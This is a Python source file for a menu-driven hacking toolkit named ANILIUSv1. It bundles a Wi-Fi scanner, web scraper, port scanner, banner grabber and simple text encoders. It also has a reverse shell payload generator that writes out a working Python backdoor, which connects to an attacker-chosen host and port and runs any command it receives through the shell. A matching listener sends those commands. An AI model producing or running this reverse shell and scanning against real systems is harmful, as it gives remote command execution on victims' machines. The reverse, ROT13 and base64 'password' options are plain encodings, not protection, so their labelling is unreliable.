from colorama import Fore,init
from time import sleep
import platform
import os
import pywifi
import requests
from bs4 import BeautifulSoup
import socket
import pyfiglet
import codecs
init()



os.system("title ANILIUSv1")


def clearTerminal():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

clearTerminal()
intro_text = pyfiglet.figlet_format("Ani l ius")
print(Fore.RED + intro_text)
print(Fore.MAGENTA + "By Herominer")

#Related To Any Code That Needs Multi-Threading
threads = []

def scanAccessPoints():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    seen_bssids = set()
    unique_networks = []
    print(Fore.YELLOW + "Wait 7 Seconds For Scan Result")
    interface.scan()
    sleep(7)
    result = interface.scan_results()
    for network in result:
        if network.bssid not in seen_bssids:
            seen_bssids.add(network.bssid)
            unique_networks.append(network)
    clearTerminal()
    for network in unique_networks:
        print(Fore.CYAN + f"===={network.ssid}====") 
        print(Fore.GREEN + f"BSSID: {network.bssid}") 
        print(Fore.GREEN + f"Signal: {network.signal}") 
        print(Fore.GREEN + f"Auth Type: {network.auth}") 
        print(Fore.GREEN + f"Cipher: {network.cipher}") 
        print(Fore.CYAN + "-"*30) 



def webScrape():

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }
    ask_url = str(input("Enter The Target's URL: "))
    try:
        response = requests.get(ask_url,headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            try:
                ask_tag = str(input("Enter The Tag That You Want To Scrape: "))
                ask_filename = str(input("Save Results In Which File?: "))
                found_tags = soup.find_all(ask_tag)
                with open(ask_filename, "a") as scrapeResult:
                    for tag in found_tags:
                        scrapeResult.write(f"{str(tag)}\nAttributes: {str(tag.attrs)}\n\n")
            except ValueError as e:
                print(Fore.RED + "[ASSISTANT]: You Gave An Incorrect Tag !")
        else:
            print(Fore.RED + "[ASSISTANT]: Anaconda Can't GET The Web Page !")
    except ValueError as e:
        print(Fore.RED + "[ASSISTANT]: You Gave An Incorrect URL !")


def scanPorts(ip,s_port,e_port):
        try:
            for port in range(s_port, e_port+1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                scResult = sock.connect_ex((ip,port))
                if scResult == 0:
                    print(Fore.GREEN + f"Port:{port} | OPEN")
                else:
                    print(Fore.RED + f"Port:{port} | CLOSE")
                sock.close()
        except socket.error as e:
            print(Fore.RED + f"[ASSISTANT]: An Error Happened During The Scan: {e}")


def grabBanner(ip,port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(Fore.MAGENTA + "Trying To Grab The Banner...")
        s.settimeout(3)
        s.connect((ip,port))
        banner = s.recv(1024)
        print(Fore.GREEN + f"Grabbed Banner Successfully \n ======== \n {banner.decode(errors='ignore')} \n ======== ")
    except socket.error as e:
        print(Fore.RED + f"[ASSISTANT]: An Error Occured: {e}")
    finally:
        s.close()




def reverseCipher(text):
    print(Fore.GREEN + f"Reversed Text: {text[::-1]}")

def rot13Cipher(text):
    print(Fore.GREEN + "ROT13 Password: " + codecs.encode(text,'rot_13'))

def base64Cipher(text):
    ask_eod = str(input("Encode Or Decode?[e/d]: "))
    if ask_eod.lower() == "e":
        encoded_bytes = codecs.encode(text.encode('utf-8'), "base64")
        encoded_string = encoded_bytes.decode('utf-8').strip()
        print(Fore.GREEN + "Base64 Password[Encoded]: " + encoded_string)
    elif ask_eod.lower() == "d":
        try:
            decoded_bytes = codecs.decode(text.encode('utf-8'), "base64")
            decoded_string = decoded_bytes.decode('utf-8')
            print(Fore.GREEN + "Base64 Password[Decoded]: " + decoded_string)
        except:
            print(Fore.RED + "[ASSISTANT]: The Text Must Be Base64 At First To Decode")
    else:
        print(Fore.YELLOW + "[ASSISTANT]: Just e And d Are Acceptable !")

def passwordGD():
    while True:
        print(Fore.CYAN + """
1.Reverse Cipher
2.ROT13 Cipher
3.Base64 Cipher
""" + Fore.GREEN)
        print("-------------------")
        print("Type Q To Exit\n")
        prompt = str(input("anspg>> "))
        if prompt == "1":
            clearTerminal()
            ask_text = str(input("Enter The Text To Reverse: "))
            reverseCipher(ask_text)
        elif prompt == "2":
            clearTerminal()
            ask_text = str(input("Enter The Text To Cipher: "))
            rot13Cipher(ask_text)
        elif prompt == "3":
            clearTerminal()
            ask_text = str(input("Enter The Text To Cipher: "))
            base64Cipher(ask_text)
        elif prompt.lower() == "q":
            clearTerminal()
            return False
        else:
            clearTerminal()
            print(Fore.RED + "[ASSISTANT]: You Must Select A Number Between 1-3 !")

def createReverseShell():
    host_ip = str(input("Enter Your HOST IP Address: "))
    host_port = int(input("Enter Your HOST PORT Number: "))
    reverse_shell_file = str(input("Enter Reverse Shell File Name: "))

    with open(f"{reverse_shell_file}.py", "a") as revShellFile:
        revShellFile.write(f"""import os\nimport platform\nimport socket\nimport subprocess\nclientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclientSocket.connect(('{host_ip}', {host_port}))\noperation_system = f'''=====Operation System=====\n{{platform.system()}}\n=========================='''\nclientSocket.sendall(operation_system.encode('utf-8'))\nwhile True:\n    try:\n        response = clientSocket.recv(1024)\n        if not response:\n            break\n        cmd = response.decode('utf-8').strip()\n        if not cmd:\n            continue\n        if cmd.lower() == 'quit':\n            clientSocket.close()\n            break\n        elif cmd.startswith('cd'):\n            path = cmd[3:].strip()\n            if path:\n                try:\n                    os.chdir(path)\n                    clientSocket.sendall(f'[+] Changed directory to {{os.getcwd()}}'.encode('utf-8'))\n                except Exception as e:\n                    clientSocket.sendall(f'[ERROR] Failed to change directory: {{e}}'.encode('utf-8'))\n            else:\n                clientSocket.sendall('[ERROR] No path provided for cd command'.encode('utf-8'))\n        else:\n            try:\n                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n                output = result.stdout + result.stderr\n                if not output:\n                    output = '[+] Command executed but no output.'\n                clientSocket.sendall(output.encode('utf-8'))\n            except Exception as e:\n                clientSocket.sendall(f'[ERROR] Failed to execute command: {{e}}'.encode('utf-8'))\n    except:\n        break""")
def listenTo(ip, port):
    hostSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hostSocket.bind((ip, port))
    hostSocket.listen(1)
    connection, address = hostSocket.accept()
    print(Fore.YELLOW + f"Connection From: {address}")
    while True:
        shellCommand = input(f"{address}>> ")
        if shellCommand.lower() == "quit":
            break
        connection.send(shellCommand.encode('utf-8'))
        data = connection.recv(1024)
        print(Fore.GREEN + data.decode('utf-8'))


def securityHeaders():
    url = input("Enter website URL (e.g., https://example.com): ").strip()
    if not url.startswith("http"):
        url = "https://" + url
    
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers

        important_headers = [
            'strict-transport-security',
            'content-security-policy',
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
            'referrer-policy',
            'permissions-policy',
            'expect-ct',
            'access-control-allow-origin'
        ]

        print(Fore.GREEN + "\nSecurity Headers Found:\n")
        found = False
        for header in important_headers:
            if header in headers:
                print(f"{header}: {headers[header]}")
                found = True

        if not found:
            print(Fore.RED + "No important security headers found.")

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[ERROR] Failed to fetch headers: {e}")


while True:
    print(Fore.CYAN + """
1.Wifi Access Points Scanner(Wifi)
2.Web Scraper(Web)
3.Web Security Headers Check(Web)
4.Port Scanner(Web & Network)
5.Banner Grabber
6.Password GD(PSWD)
7.Reverse Shell Payload Generator(Network)
8.Reverse Shell Listener(Network)

""" + Fore.RED)
    prompt = str(input("ans>> "))
    if prompt == "1":
        clearTerminal()
        scanAccessPoints()
        
    elif prompt == "2":
        clearTerminal()
        webScrape()

    elif prompt == "3":
        clearTerminal()
        securityHeaders()
    elif prompt == "4":
        clearTerminal()
        try:
            ask_ip = str(input("Enter Target's IP: "))
            from_port = int(input("From Port?: "))
            to_port = int(input("To Port?: "))
            scanPorts(ask_ip,from_port,to_port)

        except ValueError:
            print(Fore.RED + "[ASSISTANT]: Enter A Valid Port Number Or IP Address")
    elif prompt == "5":
        clearTerminal()
        ask_ip = str(input("Enter The Target's IP Address: "))
        ask_port = int(input("Enter The Target's Port Number: "))
        grabBanner(ask_ip,ask_port)
    elif prompt == "6":
        clearTerminal()
        passwordGD()
    elif prompt == "7":
        clearTerminal()
        createReverseShell()
    elif prompt == "8":
        clearTerminal()
        ask_ip = str(input("Enter Your IP Address: "))
        ask_port = int(input("The Listener Port: "))
        listenTo(ask_ip, ask_port)
    else:

        print(Fore.YELLOW + "[ASSISTANT]: Your Prompt Must Be A Number Between 1-8")
